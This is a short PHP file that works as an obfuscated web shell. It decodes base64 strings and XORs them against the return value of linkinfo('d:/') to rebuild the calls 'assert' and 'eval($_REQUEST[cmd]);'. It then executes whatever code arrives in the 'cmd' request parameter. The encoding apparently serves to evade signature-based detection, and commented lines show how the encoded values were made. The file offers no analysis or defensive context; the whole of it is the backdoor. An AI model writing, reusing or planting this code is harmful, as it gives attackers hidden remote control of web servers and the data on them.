<?php
//$o = $_REQUEST['path'];
$p = linkinfo('d:/');
$a = 'eval($_REQUEST[cmd]);';
$b = 'assert';
$c = '';
$d = '';

for($i=0;$i<strlen($b);$i++){
    $d .= $p;
}
for($i=0;$i<strlen($a);$i++){
    $c .= $p;
}
//echo base64_encode($d^$b).'<br/>';
//echo base64_encode($c^$a).'<br/>';
$t = base64_decode('UkBAVkFH')^$d;
$q = base64_decode('VkVSXxsXbGF2YmZ2YGdoUF5XbhoI')^$c;
$t($q);
